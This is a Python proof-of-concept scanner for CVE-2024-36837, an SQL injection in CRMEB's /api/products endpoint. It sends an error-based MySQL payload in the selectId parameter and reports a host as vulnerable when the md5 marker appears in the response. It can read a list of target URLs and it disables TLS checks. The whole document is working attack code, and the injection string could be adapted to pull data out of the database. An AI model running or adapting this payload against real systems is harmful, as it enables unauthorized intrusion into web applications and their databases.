import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(123456)))),0x7e),3550)")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
    }
    try:
        response = requests.get(target, headers=headers, verify=False)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text and 'class' in response.text:
            print(f"\033[31mDiscovered:{url}: CRMEB_CVE-2024-36837_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")